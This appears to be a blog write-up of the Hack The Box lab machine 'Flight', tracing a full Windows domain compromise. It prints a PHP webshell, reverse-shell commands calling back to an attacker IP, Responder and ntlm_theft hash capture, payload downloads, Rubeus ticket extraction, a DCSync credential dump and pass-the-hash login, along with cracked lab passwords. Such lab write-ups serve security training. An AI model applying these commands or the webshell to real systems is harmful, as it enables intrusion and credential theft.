---
title: "[HTB] Flight Writeup"
date: 2026-06-05 01:20:00 +0900
author: aestera
categories: [HTB, Writeup]
tags: [Windows, AD]
description: HTB Flight write-up
math: true
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a7af9035e5089332dfbfeb328d663f3e.png
---

## TL;DR

Subdomain enumeration found `school.flight.htb`, which had LFI through the view parameter. The LFI was abused with a UNC path to capture the **svc_apache** NetNTLMv2 hash using Responder. After cracking the hash, password reuse gave access to **S.Moon**. **S.Moon** had write access to the Shared SMB share, where NTLM theft files were uploaded to capture and crack **C.Bum**’s hash. **C.Bum** had write access to the Web share, allowing PHP webshell upload and reverse shell as **svc_apache**. After switching to **C.Bum** with RunasCs, an internal ASP.NET site on port 8000 was accessed through Chisel, and an ASPX webshell provided code execution as iis **apppool\defaultapppool**. A delegated Kerberos ticket was extracted with Rubeus and used to perform DCSync, recovering the Administrator NTLM hash.

---

## 1. Recon

**port scan result**

![2026-06-03-22-25-05](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/03/2026-06-03-22-25-05-1780493110678.png)

Port scan showed that the target was a Windows host in the flight.htb domain.

---

## 2. Initial Access - LFI to NetNTLMv2 Capture

First, virtual host fuzzing was performed against `flight.htb`.

```bash
└─$ ffuf -u http://flight.htb/ -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 7069 -t 50
```
![2026-06-03-23-43-46](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/03/2026-06-03-23-43-46-1780497829371.png)
The scan found the `school.flight.htb` subdomain. 

```
http://school.flight.htb/index.php?view=about.html
```
![2026-06-04-00-29-42](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-00-29-42-1780500586148.png)

The view parameter looked like it was loading local files. To confirm this behavior, I tried loading index.php.

```
http://school.flight.htb/index.php?view=index.php
```
![2026-06-04-00-32-00](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-00-32-00-1780500723538.png)
The local file was successfully included.

On Windows targets, LFI can sometimes be abused with a UNC path. If the backend tries to access an attacker-controlled SMB path, it may leak a NetNTLMv2 authentication attempt. I started Responder and pointed the view parameter to my host

```bash
└─$ sudo responder -I tun0
```

```
http://school.flight.htb/index.php?view=//10.10.14.99/test
```
![2026-06-04-01-58-20](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-01-58-20-1780505903519.png)

Responder captured the NetNTLMv2 hash for **svc_apache**.

```bash
└─$ hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

SVC_APACHE::flight:e83038c1d266fac1:8c02501d1880ad040f27696b4c7c778f:01010000000000008028954dc5f3dc01e65893705dd5249b000000000200080056004f0035004f0001001e00570049004e002d0052004a0049004600380059005400310032004600380004003400570049004e002d0052004a004900460038005900540031003200460038002e0056004f0035004f002e004c004f00430041004c000300140056004f0035004f002e004c004f00430041004c000500140056004f0035004f002e004c004f00430041004c00070008008028954dc5f3dc01060004000200000008003000300000000000000000000000003000001b0f83acbfdccae02a9f2d76060507751bed161ae8bf3a0a5652a1132c1adba20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390039000000000000000000:S@Ss!K@*t13
```
```
SVC_APACHE:S@Ss!K@*t13
```

The hash was cracked.

```bash
└─$ nxc smb flight.htb -u 'SVC_APACHE' -p 'S@Ss!K@*t13' --users-export userlist
```
![2026-06-04-02-15-45](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-02-15-45-1780506947591.png)

With a valid domain credential, SMB enumeration was performed to collect domain users.


```bash
└─$ nxc smb flight.htb -u userlist -p 'S@Ss!K@*t13' --continue-on-success
```
![2026-06-04-02-18-26](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-02-18-26-1780507108541.png)
```
S.Moon:S@Ss!K@*t13
```

The cracked password was then sprayed against the enumerated users and the same password worked for **S.Moon**.


```bash
└─$ nxc smb flight.htb -u 'S.Moon' -p 'S@Ss!K@*t13' --shares
```
![2026-06-04-02-22-26](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-02-22-26-1780507348871.png)

**S.Moon** had write permission to the `Shared` share. I generated NTLM theft files and uploaded.


```bash
└─$ python3 ntlm_theft.py -g all -s 10.10.14.99 -f a23sdgawfaw
```

```bash
└─$ smbclient //flight.htb/Shared -U 'S.Moon%S@Ss!K@*t13'

smb: \> prompt off
smb: \> lcd ntlm_theft/a23sdgawfawf/
smb: \> mput *
```

After a short time, **C.Bum** accessed one of the uploaded files and Responder captured another NetNTLMv2 hash.

![2026-06-04-13-03-18](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-13-03-18-1780545801367.png)

```
c.bum::flight.htb:ae785b5133bb6ea3:1C278BB82017963D2D7A49488A434B12:010100000000000080A9394421F4DC0199682CB8EA34076F00000000020008004B0051003500450001001E00570049004E002D0054004A0057004B00500037004C00320043004600330004003400570049004E002D0054004A0057004B00500037004C0032004300460033002E004B005100350045002E004C004F00430041004C00030014004B005100350045002E004C004F00430041004C00050014004B005100350045002E004C004F00430041004C000700080080A9394421F4DC01060004000200000008003000300000000000000000000000003000001B0F83ACBFDCCAE02A9F2D76060507751BED161AE8BF3A0A5652A1132C1ADBA20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390039000000000000000000
```

```bash
└─$ john c.bum_hash --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads

Tikkycoll_431012284 (c.bum)
```
The new hash was cracked with John.


```bash
└─$ nxc smb flight.htb -u c.bum -p 'Tikkycoll_431012284' --shares
```
![2026-06-04-13-47-08](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-13-47-08-1780548431484.png)
Using **C.Bum**, I checked SMB share permissions again. **C.Bum** had write permission to the `Web` share. Since this share appeared to map to the web directory, I uploaded a PHP webshell.

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

```bash
└─$ smbclient //flight.htb/Web -U 'C.Bum%Tikkycoll_431012284'
```
![2026-06-04-13-53-32](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-13-53-32-1780548814751.png)
![2026-06-04-13-54-15](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-13-54-15-1780548857900.png)



The webshell was reachable from the browser, so I uploaded `nc.exe` and executed a reverse shell payload.

```
nc.exe -e cmd.exe 10.10.14.99 7000
```

```bash
┌──(aestera㉿kali)-[~/HTB/flight/init/nc.exe]
└─$ rlwrap nc -lvnp 7000
listening on [any] 7000 ...
connect to [10.10.14.99] from (UNKNOWN) [10.129.228.120] 61105
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\school.flight.htb>whoami
whoami
flight\svc_apache
```
This gave a shell as **svc_apache**.


```cmd
C:\inetpub\development>netstat -ano | findstr LISTENING
```
![2026-06-04-14-14-33](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-14-14-33-1780550076446.png)
After getting the shell, I started local enumeration. netstat showed an internal web server listening on port **8000**.

```
C:\inetpub\development>net user C.Bum
net user C.Bum
User name                    C.Bum
Full Name
Comment                      Senior Web Developer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/22/2022 1:08:22 PM
Password expires             Never
Password changeable          9/23/2022 1:08:22 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/4/2026 4:11:35 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *WebDevs
The command completed successfully.
```

I also checked **C.Bum**’s group membership. **C.Bum** was a member of the WebDevs group, which suggested that this user may have access to the internal development web directory.

To operate as **C.Bum**, I used **RunasCs** with the cracked password and received a reverse shell as that user.

```
C:\ProgramData>powershell -c wget http://10.10.14.99/RunasCs.exe -outfile runascs.exe

C:\ProgramData>runascs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.99:9000 cmd
```

![2026-06-04-14-43-43](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-14-43-43-1780551838158.png)


---

## 3. Privilege Escalation - Internal ASP.NET Webshell and Kerberos Delegation

```
C:\ProgramData> chisel.exe client 10.10.14.99:8080 R:7777:127.0.0.1:8000
```
![2026-06-04-15-39-46](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-15-39-46-1780555189243.png)
Since port **8000** was only available internally, I used **Chisel** reverse port forwarding to access it from my kali host


```bash
└─$ curl -i http://localhost:7777
```
![2026-06-04-15-46-01](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-15-46-01-1780555565879.png)
The internal site was running `ASP.NET`. Since **C.Bum** had access to the development directory, I uploaded an **ASPX webshell**.


```
C:\inetpub\development>powershell -c wget http://10.10.14.99/shell.aspx -OutFile shell.aspx
```
The **ASPX webshell** was then used to execute a reverse shell payload.


```
C:\programdata\nc.exe -e cmd.exe 10.10.14.99 1337
```
![2026-06-04-16-07-02](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-16-07-02-1780556825258.png)


I used **Rubeus** to request a delegated Kerberos ticket.
```
C:\ProgramData>powershell wget http://10.10.14.99/Rubeus.exe -outfile rubeus.exe
C:\ProgramData>rubeus.exe tgtdeleg /nowrap
```
![2026-06-04-16-15-21](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-16-15-21-1780557323254.png)
The ticket was saved and converted to ccache format.

```bash
└─$ cat ticket.kiribi | base64 -d >ticket_decoded.kiribi

└─$ python kirbi2ccache.py ticket_decoded.kiribi ticket.cache
INFO:root:Parsing kirbi file /home/aestera/HTB/flight/priv/ticket_decoded.kiribi
INFO:root:Done!
```


Using the Kerberos ticket, I performed **DCSync** with secretsdump.
```bash
└─$ impacket-secretsdump -k -no-pass -dc-ip 10.129.228.120 -target-ip 10.129.228.120 'FLIGHT.HTB/G0$@g0.flight.htb' -just-dc-user Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:08c3eb806e4a83cdc660a54970bf3f3043256638aea2b62c317feffb75d89322
Administrator:aes128-cts-hmac-sha1-96:735ebdcaa24aad6bf0dc154fcdcb9465
Administrator:des-cbc-md5:c7754cb5498c2a2f
[*] Cleaning up...
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
```


The Administrator NTLM hash was recovered. Finally, the hash was used for pass-the-hash WinRM login.
```bash
└─$ evil-winrm -i 10.129.228.120 -u 'Administrator' -H 43bbfc530bab76141b12c8446e30c17c
```

![2026-06-04-16-45-54](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/06/04/2026-06-04-16-45-54-1780559156863.png)